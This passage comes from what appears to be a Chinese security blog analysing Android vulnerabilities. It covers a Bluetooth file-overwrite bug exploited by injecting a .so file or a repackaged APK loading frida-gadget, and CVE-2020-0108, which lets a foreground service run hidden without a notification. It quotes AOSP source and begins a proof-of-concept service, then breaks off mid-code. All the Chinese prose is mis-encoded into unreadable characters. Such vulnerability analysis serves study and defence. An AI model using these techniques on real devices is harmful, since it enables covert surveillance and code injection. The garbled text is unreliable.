class="line">        &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶è·¯å¾„æ˜¯ç”±è“ç‰™å¥—æ¥å­—æµè¾“å…¥æŒ‡å®šçš„ï¼Œæ²¡æœ‰å¯¹è·¯å¾„è¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¦†ç›–åœ¨<code>FactoryAirCommandManager</code>ä¸Šä¸‹æ–‡ä¸­çš„ä»»æ„æ–‡ä»¶ã€‚è€Œä¸”ï¼Œè¿™ä¸ªç¨‹åºæ‹¥æœ‰å¼ºåˆ¶æ¥å—ä»»ä½•è“ç‰™é…å¯¹è¯·æ±‚çš„æƒé™ï¼Œå› ä¸º<code>BluetoothService</code>çš„ä»£ç ä¼šè‡ªåŠ¨æ£€ç´¢å¹¶è®¾ç½®é…å¯¹<code>PIN</code>ç ã€‚è¿™å°±ä½¿å¾—æ”»å‡»è€…å¯ä»¥æ‚„æ‚„åœ°è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œè€Œä¸éœ€è¦æ¬ºéª—ç”¨æˆ·æ‰‹åŠ¨ç¡®è®¤è“ç‰™é…å¯¹ã€‚</p>
<h1 id="4-æ¼æ´åˆ©ç”¨"><a href="#4-æ¼æ´åˆ©ç”¨" class="headerlink" title="4. æ¼æ´åˆ©ç”¨"></a>4. æ¼æ´åˆ©ç”¨</h1><p>å¯ä»¥æ³¨å…¥çš„ä»£ç æœ‰ä¸¤ç§ç±»å‹ï¼š</p>
<ol>
<li><code>/data/app/A/lib</code>ä¸­çš„<code>so</code>æ–‡ä»¶ï¼›</li>
<li><code>/data/app/A/</code>ä¸­çš„<code>base.apk</code>ã€‚</li>
</ol>
<p>å¯¹äºç¬¬ä¸€ç§ç±»å‹ï¼Œå¯ä»¥ç›´æ¥æ³¨å…¥<code>so</code>ï¼Œå› ä¸ºåº”ç”¨ç¨‹åºå®‰è£…åï¼Œ<code>PackageManagerService</code>å°±ä¸ä¼šå†å¯¹<code>so</code>è¿›è¡Œæ£€æŸ¥äº†ï¼Œç›´è‡³åº”ç”¨ç¨‹åºå¸è½½æˆ–å®Œå…¨æ›´æ–°ã€‚</p>
<p>å¯¹äºç¬¬äºŒç§ç±»å‹ï¼Œæ€è·¯æ˜¯ä½¿ç”¨é‡æ‰“åŒ…çš„åŒ…æ¥æ›¿æ¢<code>base.apk</code>ï¼Œè¿™ç§æ–¹å¼è¾ƒä¸ºçµæ´»ï¼Œå¯ä»¥ç»•è¿‡åº”ç”¨ç¨‹åºå¯¹åŠ¨æ€åº“çš„æ ¡éªŒï¼Œä»¥åŠï¼Œå¯¹äºæ²¡æœ‰åº“çš„åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚è¿™ç§æ–¹å¼çš„ç¼ºç‚¹æ˜¯ï¼Œ<code>PackageManagerService</code>ä¼šåœ¨æ¯ä¸€æ¬¡é‡å¯åï¼Œé‡æ–°æ ¡éªŒåº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šå¯¼è‡´å¤±è´¥ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œè¿™ç§æ–¹å¼åªèƒ½å­˜æ´»ä¸€æ¬¡ã€‚</p>
<p>å¯¹äºç¬¬ä¸€ç§ç±»å‹ï¼Œäº¬ä¸œçš„æ€è·¯æ˜¯æ³¨å…¥å…±äº«åº“ï¼Œç„¶åï¼Œåº”ç”¨ç¨‹åºå¯åŠ¨å¹¶åŠ è½½å…±äº«åº“ï¼Œå…±äº«åº“å†å¯åŠ¨ <code>frida-gadget</code>ï¼Œæœ€åè¿è¡Œæ”»å‡»è„šæœ¬ã€‚åŒæ—¶ï¼Œäº¬ä¸œè¿˜ä½¿ç”¨äº†LIFEå¯¹åº”ç”¨ç¨‹åºåŸå§‹çš„å…±äº«åº“è¿›è¡Œæ³¨å…¥ï¼Œä½¿ç”¨LIFEæ—¶éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œè¦åœ¨æ³¨å…¥çš„æ–‡ä»¶ä¸­ä½¿ç”¨ä¸€ä¸ªè¶³å¤Ÿé•¿çš„è·¯å¾„ï¼Œå› ä¸ºAndroidä¼šåœ¨å®‰è£…è·¯å¾„ä¸­æ·»åŠ éšæœºåç¼€ã€‚</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-25T02:44:25.000Z" title="2022/6/25 10:44:25">2022-06-25</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-25T11:45:58.498Z" title="2022/6/25 19:45:58">2022-06-25</time></span><span class="level-item">11 minutes read (About 1607 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/25/Android-Foreground-%E9%A9%BB%E7%95%99%E6%BC%8F%E6%B4%9E-CVE-2020-0108/">Android Foreground é©»ç•™æ¼æ´(CVE-2020-0108)</a></p><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰å°æœåŠ¡çš„å¤„ç†ä»£ç ä¸­å­˜åœ¨ç€é€»è¾‘æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨è¯¥æ¼æ´çš„æ”»å‡»è€…å¯ä»¥ç»•è¿‡å‰å°æœåŠ¡çš„é€šçŸ¥æ˜¾ç¤ºå¹¶æŒç»­åœ¨åå°è¿è¡Œï¼Œå¯ä»¥åœ¨åå°è¿›è¡Œä¸€äº›å®šä½ã€å½•éŸ³ç­‰æ“ä½œã€‚</p>
<h1 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h1><p>Android 8.1ã€9ã€10ã€‚</p>
<h1 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h1><ul>
<li>å‰å°æœåŠ¡æ˜¯Googleåœ¨Android 8.0ä¸­å¼•å…¥çš„æ¦‚å¿µï¼Œç”±äºAndroid 8.0ä¸å…è®¸åå°å¯åŠ¨åå°æœåŠ¡ï¼Œæ‰€ä»¥è®¾è®¡äº†å‰å°æœåŠ¡ï¼Œå‰å°æœåŠ¡ä¼˜å…ˆçº§è¾ƒé«˜ï¼Œå¯ä»¥é•¿æ—¶é—´åœ¨åå°è¿è¡Œï¼Œä½†æ˜¯å‰å°æœåŠ¡åœ¨å¯åŠ¨å5ç§’å¿…é¡»ç»‘å®šä¸€ä¸ªé€šçŸ¥ï¼Œå¦åˆ™ä¼šè¢«æ€æ­»ã€‚</li>
<li>å®é™…ä¸Šï¼Œå‰å°æœåŠ¡ä¾æ—§æ˜¯åœ¨â€œåå°â€è¿è¡Œçš„ï¼Œåªæ˜¯ç”±äºç»‘å®šäº†ä¸€ä¸ªç”¨æˆ·å¯è§çš„é€šçŸ¥ï¼Œæ‰€ä»¥Googleç§°ä¹‹ä¸ºâ€œå‰å°æœåŠ¡â€ã€‚</li>
</ul>
<h2 id="æ¼æ´1"><a href="#æ¼æ´1" class="headerlink" title="æ¼æ´1"></a>æ¼æ´1</h2><p><code>NotificationManagerService.java</code>çš„<a target="_blank" rel="noopener" href="https://cs.android.com/android/platform/superproject/+/android-10.0.0_r29:frameworks/base/services/core/java/com/android/server/notification/NotificationManagerService.java;bpv=1;bpt=1;l=903?gsn=onNotificationError&gs=kythe://android.googlesource.com/platform/superproject?lang=java?path=%253Canonymous%2520com.android.server.notification.NotificationManagerService%25241%253E%23dadec13a7bb2927b4b551d172e3fa71b36e2b7496f6577cba42918727fdf287e"><code>onNotificationError()</code></a>æ–¹æ³•ï¼Œæœªèƒ½æ­£ç¡®å¤„ç†é€šçŸ¥æ˜¾ç¤ºæ—¶çš„å¼‚å¸¸ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNotificationError</span><span class="params">(<span class="type">int</span> callingUid, <span class="type">int</span> callingPid, String pkg, String tag, <span class="type">int</span> id,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> uid, <span class="type">int</span> initialPid, String message, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    cancelNotification(callingUid, callingPid, pkg, tag, id, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>, userId,</span><br><span class="line">            REASON_ERROR, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‰å°æœåŠ¡å¯åŠ¨åï¼Œå³ä½¿æœªèƒ½æ­£ç¡®åœ°æ˜¾ç¤ºé€šçŸ¥ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´å‰å°æœåŠ¡ç»ˆæ­¢ã€‚æ¯”å¦‚å‰å°æœåŠ¡åœ¨åˆ›å»ºé€šçŸ¥æ—¶ä½¿ç”¨äº†è‡ªå®šä¹‰çš„å¸ƒå±€ï¼Œåœ¨åˆ›å»º<code>RemoteViews</code>å¯¹è±¡æ—¶ä¼ å…¥äº†ä¸€ä¸ªä¸å­˜åœ¨çš„<code>layout ID</code>ï¼Œé€ æˆ<code>NotificationManagerService</code>å¯¹é€šçŸ¥çš„å¸ƒå±€è§£æå¤±è´¥è€ŒæŠ›å‡ºå¼‚å¸¸ï¼Œæ­¤æ—¶ä¼šè°ƒç”¨åˆ°<code>onNitificationError</code>æ–¹æ³•ã€‚ç”±äº<code>onNotificationError</code>æ–¹æ³•ä¸­åªæ˜¯è°ƒç”¨äº†<code>cancelNotification</code>æ–¹æ³•æ¥å–æ¶ˆé€šçŸ¥ï¼Œè€Œæ²¡æœ‰å»ç»ˆæ­¢æœåŠ¡æˆ–ç»ˆæ­¢æ•´ä¸ªåº”ç”¨ç¨‹åºï¼Œè¿™æ—¶å€™å‰å°æœåŠ¡å°±ä¼šåœ¨ä¸æ˜¾ç¤ºé€šçŸ¥çš„æƒ…å†µä¸‹ç»§ç»­è¿è¡Œã€‚</p>
<p>å®é™…æµ‹è¯•å¥½åƒè¿˜æ˜¯éœ€è¦æ•è·å¼‚å¸¸æ‰è¡Œï¼Œå¦åˆ™åº”ç”¨ç›´æ¥å´©æºƒï¼Œä½†æ˜¯æ²¡çœ‹è§åœ¨å“ªæŠ›å‡ºå¼‚å¸¸å•Šã€‚</p>
<h2 id="æ¼æ´2"><a href="#æ¼æ´2" class="headerlink" title="æ¼æ´2"></a>æ¼æ´2</h2><p><code>ServiceRecord</code>ä¸­<code>postNotification</code>æ–¹æ³•ä¸­ï¼Œæ²¡æœ‰æ­£ç¡®å¤„ç†é€šçŸ¥æ˜¾ç¤ºä¸­çš„å¼‚å¸¸æƒ…å†µï¼Œè€Œæ˜¯å°†å¼‚å¸¸æŠ›å‡ºç»™äº†ç”¨æˆ·ç¨‹åºã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postNotification</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">appUid</span> <span class="operator">=</span> appInfo.uid;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">appPid</span> <span class="operator">=</span> app.pid;</span><br><span class="line">    <span class="keyword">if</span> (foregroundId != <span class="number">0</span> &amp;&amp; foregroundNoti != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Do asynchronous communication with notification manager to</span></span><br><span class="line">        <span class="comment">// avoid deadlocks.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">localPackageName</span> <span class="operator">=</span> packageName;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">localForegroundId</span> <span class="operator">=</span> foregroundId;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Notification</span> <span class="variable">_foregroundNoti</span> <span class="operator">=</span> foregroundNoti;</span><br><span class="line">        ams.mHandler.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">NotificationManagerInternal</span> <span class="variable">nm</span> <span class="operator">=</span> LocalServices.getService(</span><br><span class="line">                        NotificationManagerInternal.class);</span><br><span class="line">                <span class="keyword">if</span> (nm == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Notification</span> <span class="variable">localForegroundNoti</span> <span class="operator">=</span> _foregroundNoti;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (localForegroundNoti.getSmallIcon() == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// It is not correct for the caller to not supply a notification</span></span><br><span class="line">                        <span class="comment">// icon, but this used to be able to slip through, so for</span></span><br><span class="line">                        <span class="comment">// those dirty apps we will create a notification clearly</span></span><br><span class="line">                        <span class="comment">// blaming the app.</span></span><br><span class="line">                        Slog.v(TAG, <span class="string">&quot;Attempted to start a foreground service (&quot;</span></span><br><span class="line">                                + shortInstanceName</span><br><span class="line">                                + <span class="string">&quot;) with a broken notification (no icon: &quot;</span></span><br><span class="line">                                + localForegroundNoti</span><br><span class="line">                                + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="type">CharSequence</span> <span class="variable">appName</span> <span class="operator">=</span> appInfo.loadLabel(</span><br><span class="line">                                ams.mContext.getPackageManager());</span><br><span class="line">                        <span class="keyword">if</span> (appName == <span class="literal">null</span>) &#123;</span><br><span class="line">                            appName = appInfo.packageName;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ctx = ams.mContext.createPackageContextAsUser(</span><br><span class="line">                                    appInfo.packageName, <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">UserHandle</span>(userId));</span><br><span class="line"></span><br><span class="line">                            Notification.<span class="type">Builder</span> <span class="variable">notiBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Notification</span>.Builder(ctx,</span><br><span class="line">                                    localForegroundNoti.getChannelId());  &lt;------- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">// it&#x27;s ugly, but it clearly identifies the app</span></span><br><span class="line">                            notiBuilder.setSmallIcon(appInfo.icon);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// mark as foreground</span></span><br><span class="line">                            notiBuilder.setFlag(Notification.FLAG_FOREGROUND_SERVICE, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="type">Intent</span> <span class="variable">runningIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(</span><br><span class="line">                                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS);</span><br><span class="line">                            runningIntent.setData(Uri.fromParts(<span class="string">&quot;package&quot;</span>,</span><br><span class="line">                                    appInfo.packageName, <span class="literal">null</span>));</span><br><span class="line">                            <span class="type">PendingIntent</span> <span class="variable">pi</span> <span class="operator">=</span> PendingIntent.getActivityAsUser(ams.mContext, <span class="number">0</span>,</span><br><span class="line">                                    runningIntent, PendingIntent.FLAG_UPDATE_CURRENT, <span class="literal">null</span>,</span><br><span class="line">                                    UserHandle.of(userId));</span><br><span class="line">                            notiBuilder.setColor(ams.mContext.getColor(</span><br><span class="line">                                    com.android.internal</span><br><span class="line">                                            .R.color.system_notification_accent_color));</span><br><span class="line">                            notiBuilder.setContentTitle(</span><br><span class="line">                                    ams.mContext.getString(</span><br><span class="line">                                            com.android.internal.R.string</span><br><span class="line">                                                    .app_running_notification_title,</span><br><span class="line">                                            appName));</span><br><span class="line">                            notiBuilder.setContentText(</span><br><span class="line">                                    ams.mContext.getString(</span><br><span class="line">                                            com.android.internal.R.string</span><br><span class="line">                                                    .app_running_notification_text,</span><br><span class="line">                                            appName));</span><br><span class="line">                            notiBuilder.setContentIntent(pi);</span><br><span class="line"></span><br><span class="line">                            localForegroundNoti = notiBuilder.build();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (nm.getNotificationChannel(localPackageName, appUid,</span><br><span class="line">                            localForegroundNoti.getChannelId()) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">targetSdkVersion</span> <span class="operator">=</span> Build.VERSION_CODES.O_MR1;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">final</span> <span class="type">ApplicationInfo</span> <span class="variable">applicationInfo</span> <span class="operator">=</span></span><br><span class="line">                                    ams.mContext.getPackageManager().getApplicationInfoAsUser(</span><br><span class="line">                                            appInfo.packageName, <span class="number">0</span>, userId);</span><br><span class="line">                            targetSdkVersion = applicationInfo.targetSdkVersion;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (targetSdkVersion &gt;= Build.VERSION_CODES.O_MR1) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(</span><br><span class="line">                                    <span class="string">&quot;invalid channel for service notification: &quot;</span></span><br><span class="line">                                            + foregroundNoti);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (localForegroundNoti.getSmallIcon() == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// Notifications whose icon is 0 are defined to not show</span></span><br><span class="line">                        <span class="comment">// a notification, silently ignoring it.  We don&#x27;t want to</span></span><br><span class="line">                        <span class="comment">// just ignore it, we want to prevent the service from</span></span><br><span class="line">                        <span class="comment">// being foreground.</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;invalid service notification: &quot;</span></span><br><span class="line">                                + foregroundNoti);</span><br><span class="line">                    &#125;</span><br><span class="line">                    nm.enqueueNotification(localPackageName, localPackageName,</span><br><span class="line">                            appUid, appPid, <span class="literal">null</span>, localForegroundId, localForegroundNoti,</span><br><span class="line">                            userId);</span><br><span class="line"></span><br><span class="line">                    foregroundNoti = localForegroundNoti; <span class="comment">// save it for amending next time</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException e) &#123; &lt;------- <span class="number">2</span></span><br><span class="line">                    Slog.w(TAG, <span class="string">&quot;Error showing notification for service&quot;</span>, e);</span><br><span class="line">                    <span class="comment">// If it gave us a garbage notification, it doesn&#x27;t</span></span><br><span class="line">                    <span class="comment">// get to be foreground.</span></span><br><span class="line">                    ams.setServiceForeground(instanceName, ServiceRecord.<span class="built_in">this</span>,</span><br><span class="line">                            <span class="number">0</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                    ams.crashApplication(appUid, appPid, localPackageName, -<span class="number">1</span>,</span><br><span class="line">                            <span class="string">&quot;Bad notification for startForeground: &quot;</span> + e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‰å°æœåŠ¡å¯åŠ¨åï¼Œè‹¥ç”¨æˆ·ç¨‹åºæ•è·äº†ä¸»çº¿ç¨‹çš„å¼‚å¸¸ï¼Œå³ä½¿æœªèƒ½æ­£ç¡®æ˜¾ç¤ºé€šçŸ¥ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´å‰å°æœåŠ¡ç»ˆæ­¢ã€‚æ¯”å¦‚è¯´å‰å°æœåŠ¡åœ¨åˆ›å»ºé€šçŸ¥æ—¶ä¼ å…¥äº†ä¸åˆæ³•çš„<code>Channel ID</code>ï¼Œè¿™æ ·åœ¨<code>ServiceRecord</code>çš„<code>postNotification</code>æ–¹æ³•ä¸­å‘é€é€šçŸ¥æ—¶ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚åœ¨å¼‚å¸¸å¤„ç†è¿‡ç¨‹ä¸­ï¼Œåªæ˜¯è°ƒç”¨äº†AMSçš„<code>crashApplication</code>æ–¹æ³•æ¥å‘åº”ç”¨æŠ›å‡ºä¸€ä¸ªä¸»çº¿ç¨‹çš„å¼‚å¸¸ï¼Œä½†æ˜¯å¦‚æœåº”ç”¨åœ¨ä¸»çº¿ç¨‹æ•è·äº†å¼‚å¸¸ï¼Œåˆ™åº”ç”¨å°±ä¸ä¼šå´©æºƒï¼Œè¿™æ—¶å€™å‰å°æœåŠ¡å°±ä¼šåœ¨ä¸æ˜¾ç¤ºé€šçŸ¥çš„æƒ…å†µä¸‹ç»§ç»­è¿è¡Œã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">crashApplication</span><span class="params">(<span class="type">int</span> uid, <span class="type">int</span> initialPid, String packageName, <span class="type">int</span> userId,</span></span><br><span class="line"><span class="params">        String message)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkCallingPermission(android.Manifest.permission.FORCE_STOP_PACKAGES)</span><br><span class="line">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Permission Denial: crashApplication() from pid=&quot;</span></span><br><span class="line">                + Binder.getCallingPid()</span><br><span class="line">                + <span class="string">&quot;, uid=&quot;</span> + Binder.getCallingUid()</span><br><span class="line">                + <span class="string">&quot; requires &quot;</span> + android.Manifest.permission.FORCE_STOP_PACKAGES;</span><br><span class="line">        Slog.w(TAG, msg);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        mAppErrors.scheduleAppCrashLocked(uid, initialPid, packageName, userId, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="æ¼æ´1-1"><a href="#æ¼æ´1-1" class="headerlink" title="æ¼æ´1"></a>æ¼æ´1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FServiceA</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;FServiceA&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Return the communication channel to the service.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.getMainLooper()).post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Looper.loop();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      </span><br><span 